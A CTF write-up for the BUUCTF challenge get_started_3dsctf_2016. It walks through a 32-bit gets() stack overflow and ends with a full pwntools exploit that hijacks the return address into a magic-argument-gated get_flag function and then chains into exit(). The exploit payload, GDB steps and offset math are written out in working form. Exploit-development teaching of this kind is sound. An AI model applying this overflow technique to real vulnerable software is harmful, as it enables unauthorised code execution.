# get_started_3dsctf_2016

**BUUCTF · PWN · Medium** — a 32-bit, statically-linked, no-frame-pointer stack buffer overflow. Hijacks return address into a magic-value-gated flag-printing function, then chains into `exit()` to survive stdio buffering on a non-interactive remote connection.

---

## TL;DR

`main()` reads unbounded input via `gets()` into a small stack buffer with no saved frame
pointer in the way. The binary ships a `get_flag()` function that's never called from
`main()`, gated behind two hardcoded magic 32-bit comparisons taken as *stack-passed*
arguments (cdecl, 32-bit calling convention — no register-passed args here). The exploit
overflows straight to `get_flag`'s address, plants the two magic values exactly where the
function expects its arguments on the stack, and — critically — chains the return from
`get_flag` into `exit()` instead of letting the program crash, because a crash loses
buffered stdout before it ever reaches the remote socket.

```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

---

## 1. Reconstructed C Source

```c
#include <stdio.h>
#include <stdlib.h>

// never called from main() — reachable only via return-address hijack
void get_flag(int a, int b) {
    if (a == 0x308cd64f && b == 0x195719d1) {
        FILE *f = fopen("/path/to/flag", "r");   // literal path recovered from .rodata
        int c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
        fclose(f);
    }
    // falls through silently otherwise — no error message, no extra output
}

int main(void) {
    char buf[... ];               // exact declared size unknown; irrelevant — gets() ignores it
    printf("Qual a palavrinha magica? ");   // Portuguese: "What's the magic word?"
    gets(buf);                     // no bounds checking whatsoever
    return 0;
}
```

Two details worth flagging about this reconstruction:

- `main()`'s disassembly shows no `push ebp` / `mov ebp, esp` prologue — the compiler
  allocated the frame purely with `sub esp, 0x3c` and addressed everything relative to
  `esp`. This is consistent with compiling at a moderate optimization level, and it directly
  changes how the overflow offset has to be calculated (see Section 4).
- `get_flag`'s two parameters are read directly as `int`, compared bit-for-bit against two
  32-bit magic constants — this is just an `if (a == X && b == Y)`, nothing exotic.

---

## 2. Disassembly Walkthrough

### 2.1 `main()` — where the bug lives

```asm
08048a20 <main>:
 8048a20: sub  esp, 0x3c             ; 60 bytes of local stack space, NO ebp frame
 8048a23: mov  [esp], 0x80bc391      ; "Qual a palavrinha magica? "
 8048a2a: call printf

 8048a2f: lea  eax, [esp+0x4]        ; eax = address of the input buffer
 8048a33: mov  [esp], eax            ; gets()'s only argument
 8048a36: call gets                  ; <-- the vulnerability: unbounded read

 8048a3b: xor  eax, eax
 8048a3d: add  esp, 0x3c
 8048a40: ret
```

`gets()` reads an arbitrary-length line from stdin with no bound on how much it writes.
The buffer it writes into sits at `esp+0x4`, inside a 60-byte (`0x3c`) frame that has no
saved base pointer to work around — `main` never pushes `ebp`.

### 2.2 `get_flag()` — the hijack target with argument-gated access

```asm
080489a0 <get_flag>:
 80489a0: push esi
 80489a1: sub  esp, 0x8

 80489a4: cmpl [esp+0x10], 0x308cd64f    ; first argument
 80489ac: jne  8048a15                    ; mismatch -> bail, no flag

 80489ae: cmpl [esp+0x14], 0x195719d1    ; second argument
 80489b6: jne  8048a15                    ; mismatch -> bail, no flag

 80489b8: mov  [esp+0x4], 0x80cdd68      ; fopen mode string, "r"
 80489c0: mov  [esp], 0x80bc388          ; flag file path
 80489c7: call fopen
 80489cc: mov  esi, eax
 ...                                       ; loop: fgetc + putchar until EOF
 80489f3: call putchar
 ...
 8048a10: call fclose
 8048a15: add  esp, 0x8
 8048a18: pop  esi
 8048a19: ret
```

Unlike the previous challenges in this series, this function isn't an unconditional
"call `system()` and done" — it's **gated**. Both 32-bit arguments must match exactly, or
execution silently falls through to the epilogue with no output at all.

---

## 3. Recon Commands Used (and why each one mattered)

This binary is statically linked, which makes `strings` and `nm` noisy — hundreds of glibc
internals (`__dl_*`, `__argz_*`, etc.) show up alongside anything the challenge author
actually wrote. The recon process that cut through that noise:

```bash
file ./start
pwn checksec ./start
```
Immediately showed `i386-32-little` — the first 32-bit binary in this series, which changes
the calling convention (stack-passed arguments instead of register-passed) and pointer size
(`p32` instead of `p64`) for everything downstream.

```bash
objdump -d ./start | grep -A5 "win\|shell\|flag\|system"
```
Surfaced `get_flag` directly by matching on the name — faster than reading the entire
disassembly of a static binary with thousands of functions.

```bash
nm -C ./start | grep -iE " T (main|vuln)"
```
Located `main` precisely, filtered out the glibc noise that a bare `nm -C ./start | grep " T "`
would otherwise produce by the hundreds.

```bash
objdump -d -M intel ./start | grep -B2 -A 60 "<main>:"
```
Pulled just `main`'s disassembly (plus some following context) instead of the whole binary,
revealing the `gets()` call and, importantly, the *absence* of a frame-pointer prologue.

```bash
readelf -r ./start
```
Confirmed a long list of `R_386_IRELATIVE` relocations — consistent with static linking and
IFUNC resolution, further explaining the symbol noise and confirming there's no PLT/GOT-based
dynamic function resolution to lean on here (unlike the earlier dynamically-linked
challenges in this series).

---

## 4. Calculating the Offset — No Frame Pointer Changes the Math

In every earlier challenge in this series, the padding formula was:

```
padding = (distance from buffer to saved ebp/rbp) + 8 (or +4 on 32-bit)
```

That formula assumes a `push ebp; mov ebp, esp` prologue exists to skip over. Here, it
doesn't — `main` addresses its stack frame purely through `esp` offsets, so the offset has
to be derived directly from the `sub esp, N` and the buffer's `esp`-relative address instead:

```
immediately after `call main`:        esp -> points at the return address
after "sub esp, 0x3c":                 esp -= 0x3c  (60 bytes below the return address)
buffer address (from "lea eax,[esp+0x4]"): esp + 0x4

distance from buffer to return address = 0x3c - 0x4 = 0x38 = 56 bytes
```

```
padding = 56 bytes, with NO additional +4/+8 — there is no saved frame pointer to skip.
```

---

## 5. Passing Arguments to the Hijacked Function (cdecl, 32-bit)

This is the part of the exploit with no equivalent in the earlier (64-bit) challenges in
this series. Under the `cdecl` calling convention used on x86 (32-bit), arguments are passed
on the stack, not in registers. Tracing `esp` through `get_flag`'s own prologue pins down
exactly where the two magic values need to sit:

```
the moment get_flag's first instruction executes:   esp = X
                                                       (X = whatever sits right after
                                                        get_flag's own address in our payload)
after "push esi":                                     esp = X - 4
after "sub esp, 0x8":                                  esp = X - 12

[esp + 0x10] = (X - 12) + 0x10 = X + 4
[esp + 0x14] = (X - 12) + 0x14 = X + 8
```

So immediately after the address of `get_flag` in the payload, the layout has to be:

```
[get_flag address] [4 bytes: fake return addr for get_flag] [arg1] [arg2]
                           (X)                                 (X+4)  (X+8)
```

The 4 bytes right after `get_flag`'s address act as a fake return address *for `get_flag`
itself* — the value `get_flag` will `ret` into once it's done. Section 7 explains why this
can't just be filler.

Verified empirically in GDB before trusting the math:

```
(gdb) break *0x80489a4
(gdb) run < payload.bin
Breakpoint 1, 0x080489a4 in get_flag ()
(gdb) x/2xw $esp+0x10
0xffffd464: 0x308cd64f 0x195719d1
```

Both magic values landed exactly where predicted — confirming the offset arithmetic without
relying on it blindly.

---

## 6. Payload Layout

```
┌─────────────┬──────────────┬───────────────────┬──────────────┬──────────────┐
│  56 bytes    │  get_flag    │  fake return addr  │  0x308cd64f   │  0x195719d1   │
│  'A' padding │  address     │  for get_flag      │  (arg 1)      │  (arg 2)      │
│  (4B each)   │  (4 bytes)   │  (4 bytes)         │  (4 bytes)    │  (4 bytes)    │
└─────────────┴──────────────┴───────────────────┴──────────────┴──────────────┘
```

Total: 56 + 4 + 4 + 4 + 4 = 72 bytes.

---

## 7. The Second Obstacle: Losing the Flag to Buffered stdout on a Crash

A first attempt used a throwaway value (`'BBBB'` / `0x42424242`) as `get_flag`'s fake return
address, reasoning that once the flag had been printed, where the program went next
shouldn't matter. Against the remote service, this produced:

```
[*] Switching to interactive mode
timeout: the monitored command dumped core
[*] Got EOF while reading in interactive
```

The flag text never arrived — despite GDB having already confirmed the magic-value
comparisons pass. Here's why: when `get_flag` finishes and executes its own `ret`, it jumps
to `0x42424242` — not a valid instruction address — and the process receives SIGSEGV. But
the flag's characters were written via `putchar()`, and when a program's stdout isn't an
interactive terminal (as is the case for a piped/socket connection, like a remote CTF
service), glibc fully buffers stdout internally rather than flushing after each character or
line. That buffer is normally flushed either when it fills up or when the process exits
cleanly. **A crash skips both** — the buffered flag text is discarded along with the rest of
the process's state, and the remote connection sees nothing.

This is the same buffering class of issue noted in `stdbuf -o0` fixes from earlier, applied
to a new context: there it was about pipe buffering during local testing, here it's about
surviving a return into an invalid address during exploitation.

### The fix: chain into `exit()` instead of crashing

```bash
nm -C ./start | grep -w "T exit"
# 0804e6a0 T exit
```

Replacing the throwaway fake return address with the address of `exit()` means that once
`get_flag` finishes, instead of jumping into garbage, it jumps into a real, well-behaved
function that flushes every open stdio stream (via `atexit`-registered flush handlers) before
terminating the process cleanly:

```
main → overflow → ret into get_flag
get_flag: both cmpl checks pass → fopen → fgetc/putchar loop (flag text sits in stdio's internal buffer)
get_flag finishes → ret → jumps into exit() instead of an invalid address
exit() flushes all open stdio buffers → the buffered flag text is finally written out
process terminates cleanly, no SIGSEGV
```

---

## 8. Final Exploit

```python
from pwn import *

context.arch = 'i386'          # 32-bit — changes p32 vs p64 and the calling convention

p = remote('<host>', <port>)   # or process('./start') for local testing

PADDING   = 56                 # distance from buf to the return address (no saved ebp to skip)
GET_FLAG  = 0x080489a0         # hijack target: argument-gated flag printer
EXIT_ADDR = 0x0804e6a0         # exit() — flushes buffered stdout before terminating
MAGIC_1   = 0x308cd64f         # get_flag's first argument, read from [esp+0x10]
MAGIC_2   = 0x195719d1         # get_flag's second argument, read from [esp+0x14]

payload = (
    b'A' * PADDING +
    p32(GET_FLAG) +
    p32(EXIT_ADDR) +    # fake return address for get_flag -> clean exit instead of a crash
    p32(MAGIC_1) +
    p32(MAGIC_2)
)

p.sendline(payload)
p.interactive()
```

---

## 9. GDB Verification Commands Used

Before writing the final pwntools exploit, the payload was built as a standalone raw file
and fed into GDB directly. This matters more than it looks: typing escape sequences like
`\x08` directly into a terminal never produces the intended raw bytes — the shell sends the
literal characters `\`, `x`, `0`, `8` instead of the single byte `0x08`. Building the payload
in Python and writing it to a file sidesteps that entirely, and `xxd` lets the exact byte
layout be confirmed before trusting it to a live process:

```bash
python3 -c "
import struct
payload = (
    b'A' * 56 +
    struct.pack('<I', 0x080489a0) +   # get_flag
    b'B' * 4 +                         # placeholder fake return addr, replaced later
    struct.pack('<I', 0x308cd64f) +   # arg 1
    struct.pack('<I', 0x195719d1)     # arg 2
)
import sys
sys.stdout.buffer.write(payload)
" > payload.bin

ls -al payload.bin      # sanity-check the total length (72 bytes expected)
xxd payload.bin         # visually confirm the byte layout before trusting it to gdb
```

`struct.pack('<I', ...)` is the 32-bit equivalent of `p32()` from pwntools — `<` for
little-endian, `I` for an unsigned 32-bit integer. Used here instead of pwntools directly so
the raw bytes could be inspected and replayed into GDB with simple shell redirection, without
needing a live pwntools process attached.

```bash
gdb ./start
(gdb) break *0x80489a4          # right at the first cmpl inside get_flag
(gdb) run < payload.bin         # redirect MUST be part of the same `run` command —
                                 # typing it separately after `run` sends it as literal
                                 # program input instead of a shell redirect
(gdb) x/2xw $esp+0x10           # confirms both magic values landed exactly where predicted
(gdb) continue                  # lets get_flag actually run and print (or attempt to read) the file
```

A subtlety worth calling out explicitly, since it caused a wasted run: `run < payload.bin`
has to be typed as a single command before pressing Enter. Typing `run`, letting the program
block on `gets()`, and then typing `< payload.bin` afterward sends that literal text as
program input rather than redirecting stdin — the process just reads a short, harmless
string and exits normally without ever reaching the breakpoint.

---

## 10. Comparing This Challenge to the Rest of the Series

| | 64-bit challenges (earlier in this series) | This challenge |
|---|---|---|
| Architecture | amd64 | i386 (32-bit) |
| Argument passing | registers (`rdi`, `rsi`, `rdx`, ...) | **stack** (cdecl) |
| Pointer/address size | 8 bytes (`p64`) | 4 bytes (`p32`) |
| Frame pointer | always present (`push rbp`) | **absent** in `main` — offsets computed from `esp` directly |
| Hijack target | unconditional `system(...)` call | **argument-gated**: must supply exact matching values |
| Post-hijack cleanup | not needed (ret2win targets didn't return anywhere meaningful) | **required** — had to redirect the post-`get_flag` return into `exit()` to avoid losing buffered output to a crash |

---

## Key Takeaways

- Never assume a frame-pointer prologue exists. Check the disassembly for `push ebp` /
  `mov ebp, esp` before reusing a padding formula from a previous challenge — without it,
  offsets must be computed directly from `sub esp, N` and the buffer's `esp`-relative address.
- On 32-bit `cdecl` binaries, arguments are passed on the stack, not in registers — hijacking
  a function that expects arguments means planting those argument values at the correct
  stack offsets *after* the hijacked function's own fake return address, not just jumping to
  its entry point.
- A crash doesn't just end the program — it can **destroy buffered output that was never
  flushed**, which is exactly what happens to `putchar()`-written data when stdout isn't an
  interactive terminal (true of essentially every CTF remote connection). Chaining a hijacked
  function's return into `exit()` (or another function that triggers a clean stdio flush)
  is often required to actually observe output that was technically "already printed."
  the program's perspective.
- With a statically linked binary, `nm`/`strings` output is dominated by glibc internals —
  filter aggressively (`grep -iE " T (main|vuln)"`, targeted `objdump -d | grep -A N`) rather
  than reading unfiltered output.
- In GDB, `run < file` must be typed as one command before execution starts. Typing the
  redirect after the program has already begun blocking on input sends it as literal program
  input instead.

---

